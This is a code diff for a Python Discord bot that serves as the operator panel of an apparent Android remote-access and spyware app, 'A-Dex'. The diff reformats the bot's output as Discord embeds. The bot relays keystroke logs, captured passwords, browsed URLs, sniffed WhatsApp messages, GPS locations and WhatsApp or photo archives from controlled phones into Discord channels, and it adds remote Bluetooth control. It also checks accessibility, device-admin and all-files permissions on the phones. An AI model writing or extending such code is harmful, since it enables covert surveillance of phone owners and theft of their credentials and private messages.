@@ -173,48 +173,77 @@ class FileBrowserView(discord.ui.View):
     def is_owner(self, interaction: discord.Interaction) -> bool:
         return interaction.user.id == self.owner_user_id
 
-    def render_text(self) -> str:
-        lines = [
-            f"**File Browser** | Path: `{self.session.current_path or 'Root'}`",
-            f"Page `{self.session.page}`",
-        ]
+    def render_embed(self) -> discord.Embed:
+        path = self.session.current_path or "Root"
+        embed = discord.Embed(
+            title="📂 File Explorer",
+            description=f"📍 **Path:** `{path}`\n📄 **Page:** `{self.session.page}`",
+            color=discord.Color.blue(),
+            timestamp=discord.utils.utcnow()
+        )
+        
         if not self.session.items:
-            lines.append("- (Empty Directory)")
+            embed.description += "\n\n❌ *This directory is empty or inaccessible.*"
         else:
+            list_text = ""
             for item in self.session.items:
                 marker = "📁" if item.get("isDirectory") else "📄"
                 size = item.get("size") or 0
-                lines.append(f"{marker} `{item.get('name')}` - {size} bytes")
-        return "\n".join(lines)
+                name = item.get('name')
+                
+                size_str = f"{size} B"
+                if size > 1024 * 1024: size_str = f"{size / (1024*1024):.1f} MB"
+                elif size > 1024: size_str = f"{size / 1024:.1f} KB"
+                
+                list_text += f"{marker} `{name}` ({size_str})\n"
+            
+            if len(list_text) > 2000:
+                list_text = list_text[:1990] + "..."
+            embed.add_field(name="Contents", value=list_text or "No items found", inline=False)
+            
+        embed.set_footer(text=f"Total: {len(self.session.items)} items | Time: {discord.utils.utcnow().strftime('%H:%M:%S')}")
+        return embed
 
     def rebuild_buttons(self) -> None:
         self.clear_items()
         
-        btn_up = discord.ui.Button(style=discord.ButtonStyle.secondary, label="Up (..)", row=0)
+        # Row 0: Navigation
+        btn_up = discord.ui.Button(style=discord.ButtonStyle.secondary, label="Parent (..)", row=0, emoji="⬆️")
         btn_up.callback = self.handle_up
         self.add_item(btn_up)
         
-        btn_refresh = discord.ui.Button(style=discord.ButtonStyle.secondary, label="Refresh", row=0)
+        btn_refresh = discord.ui.Button(style=discord.ButtonStyle.secondary, label="Refresh", row=0, emoji="🔄")
         btn_refresh.callback = self.handle_refresh
         self.add_item(btn_refresh)
+
+        # Row 1: Common Roots
+        btn_internal = discord.ui.Button(style=discord.ButtonStyle.success, label="Internal", row=1, emoji="📱")
+        btn_internal.callback = lambda i: self._fetch_dir(i, "/sdcard", 1)
+        self.add_item(btn_internal)
+
+        btn_storage = discord.ui.Button(style=discord.ButtonStyle.success, label="Storage", row=1, emoji="💾")
+        btn_storage.callback = lambda i: self._fetch_dir(i, "/storage", 1)
+        self.add_item(btn_storage)
         
-        btn_prev = discord.ui.Button(style=discord.ButtonStyle.primary, label="Prev Page", row=1)
+        # Row 2: Pagination
+        btn_prev = discord.ui.Button(style=discord.ButtonStyle.primary, label="Prev", row=2, emoji="⬅️")
         btn_prev.callback = self.handle_prev
         self.add_item(btn_prev)
         
-        btn_next = discord.ui.Button(style=discord.ButtonStyle.primary, label="Next Page", row=1)
+        btn_next = discord.ui.Button(style=discord.ButtonStyle.primary, label="Next", row=2, emoji="➡️")
         btn_next.callback = self.handle_next
         self.add_item(btn_next)
 
+        # Row 3: Select Item
         options = []
-        for item in self.session.items:
+        for item in self.session.items[:25]: # Max 25 in select
             name = str(item.get("name"))[:90]
             val = str(item.get("name"))
             desc = "Directory" if item.get("isDirectory") else "File"
             options.append(discord.SelectOption(label=name, value=val, description=desc, emoji="📁" if item.get("isDirectory") else "📄"))
         
         if options:
-            self.add_item(FileBrowserSelect(options[:25]))
+            self.add_item(FileBrowserSelect(options))
 
     async def _fetch_dir(self, interaction: discord.Interaction, path: str, page: int = 1) -> None:
         if not self.is_owner(interaction):
@@ -243,7 +272,7 @@ class FileBrowserView(discord.ui.View):
         
         self.rebuild_buttons()
         if self.message:
-            await self.message.edit(content=self.render_text(), view=self)
+            await self.message.edit(embed=self.render_embed(), view=self)
 
     async def handle_up(self, interaction: discord.Interaction) -> None:
         import os
@@ -314,7 +343,7 @@ class LockAppSearchModal(discord.ui.Modal, title="Search Apps"):
         self._view.session.page = 0
         self._view.rebuild_buttons()
         if self._view.message:
-            await self._view.message.edit(content=self._view.render_text(), view=self._view)
+            await self._view.message.edit(embed=self._view.render_embed(), view=self._view)
         await interaction.response.send_message("Search applied.", ephemeral=True)
 
 
@@ -345,23 +374,30 @@ class LockAppPickerView(discord.ui.View):
     def is_owner(self, interaction: discord.Interaction) -> bool:
         return interaction.user.id == self.owner_user_id
 
-    def render_text(self) -> str:
+    def render_embed(self) -> discord.Embed:
         total = len(self.session.filtered_apps())
         query_text = self.session.query or "(none)"
         items = self.session.page_items()
-        lines = [
-            f"Lock App Picker | Query: `{query_text}`",
-            f"Page `{self.session.page + 1}/{self.session.page_count()}` | Total shown: `{total}`",
-            "Use buttons below to lock/unlock.",
-        ]
+        
+        embed = discord.Embed(
+            title="🔒 App Lock Management",
+            description=f"🔍 **Search Query:** `{query_text}`\n📃 **Page:** `{self.session.page + 1}/{self.session.page_count()}` | **Total:** `{total}`",
+            color=discord.Color.gold(),
+            timestamp=discord.utils.utcnow()
+        )
+        
         if not items:
-            lines.append("- No apps matched.")
+            embed.description += "\n\n⚠️ *No matching apps found.*"
         else:
+            list_text = ""
             for item in items:
                 package_name = item["packageName"]
-                status = "LOCKED" if package_name in self.session.locked_packages else "UNLOCKED"
-                lines.append(f"- `{item['label']}` (`{package_name}`) [{status}]")
-        return "\n".join(lines)
+                status = "🔴 `LOCKED`" if package_name in self.session.locked_packages else "🟢 `PUBLIC`"
+                list_text += f"{status} **{item['label']}**\n- `{package_name}`\n"
+            embed.add_field(name="Application Inventory", value=list_text, inline=False)
+            
+        embed.set_footer(text="Tap buttons below to toggle restrictions")
+        return embed
 
     def rebuild_buttons(self) -> None:
         self.clear_items()
@@ -401,7 +437,7 @@ class LockAppPickerView(discord.ui.View):
 
         self.rebuild_buttons()
         if self.message:
-            await self.message.edit(content=self.render_text(), view=self)
+            await self.message.edit(embed=self.render_embed(), view=self)
 
     async def refresh_state(self, interaction: discord.Interaction) -> None:
         if not self.is_owner(interaction):
@@ -427,7 +463,7 @@ class LockAppPickerView(discord.ui.View):
 
         self.rebuild_buttons()
         if self.message:
-            await self.message.edit(content=self.render_text(), view=self)
+            await self.message.edit(embed=self.render_embed(), view=self)
 
 
 class RemoteControlView(discord.ui.View):
@@ -516,7 +552,7 @@ class LockPageButton(discord.ui.Button["LockAppPickerView"]):
             return
         self.view.session.page += self.direction
         self.view.rebuild_buttons()
-        await interaction.response.edit_message(content=self.view.render_text(), view=self.view)
+        await interaction.response.edit_message(embed=self.view.render_embed(), view=self.view)
 
 
 class LockSearchButton(discord.ui.Button["LockAppPickerView"]):
@@ -547,66 +583,105 @@ def format_error(exc: Exception) -> str:
 
 
 
-def format_result_message(result: dict[str, Any]) -> str:
+def format_result_message_embed(result: dict[str, Any]) -> discord.Embed:
     command_name = result.get("commandName", "unknown")
     device_id = result.get("deviceId", "unknown")
+    status = result.get("status")
+    
+    color = discord.Color.green() if status == "success" else discord.Color.red()
+    embed = discord.Embed(
+        title=f"📡 Command Result: `{command_name}`",
+        description=f"**Device:** `{device_id}`",
+        color=color,
+        timestamp=discord.utils.utcnow()
+    )
 
-    if result.get("status") == "success":
+    if status == "success":
         data = result.get("data") or {}
+        
         if command_name == "files":
             files = data.get("files") or []
-            if isinstance(files, list):
-                header = (
-                    f"Path: `{data.get('path', '-')}` | "
-                    f"Page: `{data.get('page', 1)}/{data.get('totalPages', 1)}` | "
-                    f"Items: `{len(files)}` of `{data.get('totalItems', len(files))}`"
-                )
-                lines = []
-                for item in files[:25]:
-                    if not isinstance(item, dict):
-                        continue
-                    mark = "DIR" if item.get("isDirectory") else "FILE"
-                    name = item.get("name", "unknown")
-                    size = item.get("size", 0)
-                    modified = item.get("modifiedAt", 0)
-                    lines.append(f"- `{mark}` {name} | {size} bytes | mtime: {modified}")
-                body = "\n".join(lines) if lines else "- (empty)"
-                return f"Command `files` completed on device `{device_id}`.\n{header}\n{body}"
+            header = f"📍 `{data.get('path', '/')}` | 📄 `{data.get('page', 1)}/{data.get('totalPages', 1)}`"
+            lines = []
+            for item in files[:20]:
+                if not isinstance(item, dict): continue
+                mark = "📁" if item.get("isDirectory") else "📄"
+                lines.append(f"{mark} `{item.get('name')}` ({item.get('size', 0)} bytes)")
+            
+            embed.add_field(name="File Listing", value="\n".join(lines) or "Empty directory", inline=False)
+            embed.set_footer(text=header)
 
-        if command_name == "filestat":
-            stat = data.get("stat")
-            if isinstance(stat, dict):
-                return (
-                    f"Command `filestat` completed on device `{device_id}`.\n"
-                    f"Path: `{stat.get('path')}`\n"
-                    f"Type: `{'dir' if stat.get('isDirectory') else 'file'}` | "
-                    f"Size: `{stat.get('size', 0)}` | Modified: `{stat.get('modifiedAt', 0)}`"
-                )
+        elif command_name == "info":
+            details = "\n".join([f"**{k}:** `{v}`" for k, v in data.items() if k != "deviceId"])
+            embed.add_field(name="Device Details", value=details or "No details provided", inline=False)
 
-        if command_name == "getimages":
-            count = data.get("count", 0)
+        elif command_name == "permstatus":
+            perms = data.get("runtimePermissions") or {}
+            perm_list = "\n".join([f"{'✅' if v else '❌'} {k.capitalize()}" for k, v in perms.items()])
+            features = (
+                f"**Overlay:** `{'OK' if data.get('overlayPermission') else 'OFF'}`\n"
+                f"**Access:** `{'OK' if data.get('accessibilityServiceEnabled') else 'OFF'}`\n"
+                f"**Admin:** `{'OK' if data.get('deviceAdminEnabled') else 'OFF'}`\n"
+                f"**All Files:** `{'OK' if data.get('allFilesAccess') else 'OFF'}`"
+            )
+            embed.add_field(name="Permissions", value=perm_list or "N/A", inline=True)
+            embed.add_field(name="Core Modules", value=features, inline=True)
+
+        elif command_name == "location":
+            lat = data.get("latitude")
+            lon = data.get("longitude")
+            acc = data.get("accuracy")
+            embed.add_field(name="Coordinates", value=f"📍 `{lat}, {lon}`\n🎯 Accuracy: `{acc}m`", inline=False)
+            if lat and lon:
+                embed.url = f"https://www.google.com/maps?q={lat},{lon}"
+
+        elif command_name == "usage":
+            apps = data.get("usage") or []
+            usage_list = "\n".join([f"**{a.get('label')}**: `{a.get('usageTime')}` minutes" for a in apps[:15]])
+            embed.add_field(name="Top Usage Today", value=usage_list or "No usage data", inline=False)
+
+        elif command_name == "getimages" or command_name == "getwhatsapp":
             url = data.get("fileUrl")
-            return f"✅ **Images Captured!**\nFound `{count}` images.\nDownload Zip: {url}" if url else f"✅ Found `{count}` images (upload pending)."
+            info = data.get("info") or ""
+            embed.description = f"📂 **Archive Available!**\n{info}\n\n[Click here to download archive]({url})" if url else f"⌛ {info}\nProcessing archive..."
 
-        data_text = ""
-        if result.get("data") is not None:
-            serialized = json.dumps(result.get("data"), ensure_ascii=False)
-            data_text = f"\nData: `{serialized[:500]}`"
-        return f"Command `{command_name}` completed on device `{device_id}`.{data_text}"
+        elif command_name == "bluetooth":
+            status = data.get("enabled", False)
+            mark = "🔵" if status else "⚪"
+            details = (
+                f"**State:** `{data.get('state', 'UNKNOWN')}`\n"
+                f"**Name:** `{data.get('name', 'unknown')}`\n"
+                f"**Address:** `{data.get('address', 'unknown')}`\n"
+                f"**Bonded:** `{data.get('bondedDevicesCount', 0)}`"
+            )
+            embed.add_field(name=f"{mark} Bluetooth Adapter", value=details, inline=False)
+            
+            if data.get("bondedDevices"):
+                bonded = "\n".join([f"- **{d['name']}** (`{d['address']}`)" for d in data["bondedDevices"][:5]])
+                embed.add_field(name="Bonded Devices (Recent)", value=bonded or "None", inline=True)
 
-    error_code = result.get("errorCode") or "UNKNOWN"
-    error_message = result.get("errorMessage") or ""
-    if command_name == "screenshot" and error_code == "ACCESSIBILITY_SERVICE_NOT_ACTIVE":
-        return (
-            f"Command `{command_name}` failed on device `{device_id}`: {error_code}.\n"
-            "Fix: Open the app -> tap `Open Permission Setup` -> enable A-Dex Accessibility Service -> retry `/screenshot`."
-        )
-    if command_name == "shield" and error_code == "ACCESSIBILITY_SERVICE_NOT_ACTIVE":
-        return (
-            f"Command `{command_name}` failed on device `{device_id}`: {error_code}.\n"
-            "Fix: Open the app -> Open Permission Setup -> enable A-Dex Accessibility Service -> retry `/shield action:enable`."
-        )
-    return f"Command `{command_name}` failed on device `{device_id}`: {error_code} {error_message}".strip()
+            if data.get("discoveredDevices"):
+                disc = "\n".join([f"- **{d['name']}** (`{d['address']}`)" for d in data["discoveredDevices"][:8]])
+                embed.add_field(name="Discovered Devices", value=disc or "None", inline=True)
+            elif data.get("isDiscovering"):
+                embed.add_field(name="Discovered Devices", value="🔍 *Discovery in progress...*", inline=True)
+
+        else:
+            # Fallback for other successful commands
+            serialized = json.dumps(data, indent=2, ensure_ascii=False)
+            if len(serialized) > 1000: serialized = serialized[:990] + "..."
+            embed.add_field(name="Output Data", value=f"```json\n{serialized}\n```", inline=False)
+
+    else:
+        error_code = result.get("errorCode") or "UNKNOWN_ERROR"
+        error_msg = result.get("errorMessage") or "No message provided."
+        embed.add_field(name="Error Code", value=f"`{error_code}`", inline=True)
+        embed.add_field(name="Description", value=error_msg, inline=False)
+        
+        if error_code == "ACCESSIBILITY_SERVICE_NOT_ACTIVE":
+            embed.add_field(name="💡 Solution", value="Ensure accessibility is on in Phone Settings -> Accessibility -> A-Dex.", inline=False)
+
+    return embed
 
 
 
@@ -954,7 +1029,7 @@ class ADexDiscordClient(discord.Client):
                 await interaction.followup.send("Setup check timed out. Try again in a few seconds.")
                 return
             if result.get("status") != "success":
-                await interaction.followup.send(format_result_message(result))
+                await interaction.followup.send(embed=format_result_message_embed(result))
                 return
 
             data = result.get("data") or {}
@@ -1350,6 +1425,17 @@ class ADexDiscordClient(discord.Client):
         async def sendwhatsapp(interaction: discord.Interaction, number: str, message: str) -> None:
             await self._queue_remote_command(interaction, "sendwhatsapp", {"number": number, "message": message})
 
+        @self.tree.command(name="bluetooth", description="Get status or control Bluetooth")
+        @app_commands.describe(action="Status, enable, or disable")
+        @app_commands.choices(action=[
+            app_commands.Choice(name="status", value="status"),
+            app_commands.Choice(name="enable", value="enable"),
+            app_commands.Choice(name="disable", value="disable"),
+            app_commands.Choice(name="scan", value="scan"),
+        ])
+        async def bluetooth(interaction: discord.Interaction, action: app_commands.Choice[str]) -> None:
+            await self._queue_remote_command(interaction, "bluetooth", {"action": action.value})
+
         @self.tree.command(name="pair", description="Pair channel with one-time device code")
         @app_commands.describe(code="One-time pairing code shown in app")
         async def pair(interaction: discord.Interaction, code: str) -> None:
@@ -1598,13 +1684,27 @@ class ADexDiscordClient(discord.Client):
                     await interaction.followup.send(f"No devices found with status: `{filter.value}`.")
                     return
 
-                lines = []
+                embed = discord.Embed(
+                    title=f"📱 Devices Inventory ({filter.value.capitalize()})",
+                    color=discord.Color.brand_green() if filter.value == "online" else discord.Color.red(),
+                    timestamp=discord.utils.utcnow()
+                )
+
                 for d in filtered:
-                    status = "🟢" if d.get("status") == "online" else "🔴"
-                    lines.append(f"{status} **{d.get('model', 'Unknown')}** - ID: `{d['id']}`")
-                
-                output = "\n".join(lines)
-                await interaction.followup.send(f"**Devices ({filter.value}):**\n{output}")
+                    status_emoji = "🟢 `ONLINE`" if d.get("status") == "online" else "🔴 `OFFLINE`"
+                    model = d.get('model', 'Unknown Device')
+                    device_id = d['id']
+                    last_seen = d.get('lastSeen', 'N/A')
+                    
+                    value = (
+                        f"🆔 **ID:** `{device_id}`\n"
+                        f"📡 **Status:** {status_emoji}\n"
+                        f"🕒 **Last Seen:** {last_seen}"
+                    )
+                    embed.add_field(name=f"📦 {model}", value=value, inline=False)
+
+                embed.set_footer(text=f"Total: {len(filtered)} devices", icon_url=interaction.guild.icon.url if interaction.guild.icon else None)
+                await interaction.followup.send(embed=embed)
             except Exception as e:
                 await interaction.followup.send(f"Error: {e}")
 
@@ -1624,18 +1724,24 @@ class ADexDiscordClient(discord.Client):
                 for d in devices[:25]:
                     did = d["id"]
                     model = d.get("model", "Unknown")
-                    btn = discord.ui.Button(label=f"Control {model} ({did[:4]})", style=discord.ButtonStyle.success)
+                    btn = discord.ui.Button(label=f"Control {model} ({did[:4]})", style=discord.ButtonStyle.success, emoji="🎮")
                     
                     def make_callback(device_id, device_model):
                         async def callback(inner_inter: discord.Interaction):
                             rc_view = RemoteControlView(self, device_id, inner_inter.user.id)
-                            await inner_inter.response.send_message(f"Remote control for **{device_model}** (`{device_id}`):", view=rc_view, ephemeral=True)
+                            embed = discord.Embed(
+                                title="🎮 Remote Device Control",
+                                description=f"You are currently controlling:\n**{device_model}** (`{device_id}`)\n\nUse the buttons below to interact.",
+                                color=discord.Color.gold()
+                            )
+                            embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/3233/3233857.png")
+                            await inner_inter.response.send_message(embed=embed, view=rc_view, ephemeral=True)
                         return callback
                     
                     btn.callback = make_callback(did, model)
                     view.add_item(btn)
                 
-                await interaction.followup.send("Select an online device to control:", view=view)
+                await interaction.followup.send("🎮 Select an online device to control:", view=view)
             except Exception as e:
                 await interaction.followup.send(f"Error: {e}")
 
@@ -1887,7 +1993,7 @@ class ADexDiscordClient(discord.Client):
         if not isinstance(channel, discord.abc.Messageable):
             return
 
-        text = format_result_message(payload)
+        embed = format_result_message_embed(payload)
         media_id = payload.get("mediaId")
 
         if media_id:
@@ -1898,12 +2004,12 @@ class ADexDiscordClient(discord.Client):
                     ext = content_type.split("/")[1].split(";")[0] or "bin"
                 filename = f"{payload.get('commandName', 'command')}-{payload.get('commandId', 'result')}.{ext}"
                 file = discord.File(io.BytesIO(media_bytes), filename=filename)
-                await channel.send(content=text, file=file)
+                await channel.send(embed=embed, file=file)
             except Exception as exc:
                 print("Failed to publish media result:", exc)
-                await channel.send(content=text)
+                await channel.send(embed=embed)
         else:
-            await channel.send(content=text)
+            await channel.send(embed=embed)
 
     async def _publish_device_event(self, payload: dict[str, Any]) -> None:
         event_type = payload.get("eventType")
@@ -1937,21 +2043,40 @@ class ADexDiscordClient(discord.Client):
             text = data.get("text") or ""
             package = data.get("packageName") or "unknown"
             if text:
-                await channel.send(f"⌨️ **Keylog** from `{device_id}` (`{package}`):\n```{text}```")
+                embed = discord.Embed(title="⌨️ Keylog Activity", color=discord.Color.dark_grey(), timestamp=discord.utils.utcnow())
+                embed.set_author(name=f"Device: {device_id}")
+                embed.description = f"**App:** `{package}`\n```text\n{text}\n```"
+                await channel.send(embed=embed)
+
         elif event_type == "password_sniff":
             text = data.get("text") or ""
             package = data.get("packageName") or "unknown"
-            await channel.send(f"🔐 **Password Captured** on `{device_id}` (`{package}`):\n`{text}`")
+            embed = discord.Embed(title="🔐 Password Captured", color=discord.Color.red(), timestamp=discord.utils.utcnow())
+            embed.set_author(name=f"Device: {device_id}")
+            embed.description = f"**App:** `{package}`\n**Value:** `{text}`"
+            await channel.send(embed=embed)
+
         elif event_type == "browser_url":
             url = data.get("url") or ""
             package = data.get("packageName") or "unknown"
-            await channel.send(f"🌐 **Browser Activity** on `{device_id}` (`{package}`):\nURL: <{url}>")
+            embed = discord.Embed(title="🌐 Browser Navigation", color=discord.Color.blue(), timestamp=discord.utils.utcnow())
+            embed.set_author(name=f"Device: {device_id}")
+            embed.description = f"**App:** `{package}`\n**URL:** {url}"
+            await channel.send(embed=embed)
+
         elif event_type == "app_launch":
             package = data.get("packageName") or "unknown"
-            await channel.send(f"🚀 **App Launch** on `{device_id}`: `{package}`")
+            embed = discord.Embed(title="🚀 Application Launched", color=discord.Color.green(), timestamp=discord.utils.utcnow())
+            embed.set_author(name=f"Device: {device_id}")
+            embed.description = f"**Package:** `{package}`"
+            await channel.send(embed=embed)
+
         elif event_type == "whatsapp_message_sniff":
             text = data.get("text") or ""
-            await channel.send(f"💬 **WhatsApp Message Snipped** on `{device_id}`:\n```{text}```")
+            embed = discord.Embed(title="💬 WhatsApp Intel", color=discord.Color.brand_green(), timestamp=discord.utils.utcnow())
+            embed.set_author(name=f"Device: {device_id}")
+            embed.description = f"```\n{text}\n```"
+            await channel.send(embed=embed)
 
     async def _handle_auto_enroll_event(self, payload: dict[str, Any]) -> None:
         channel_id_raw = payload.get("channelId")
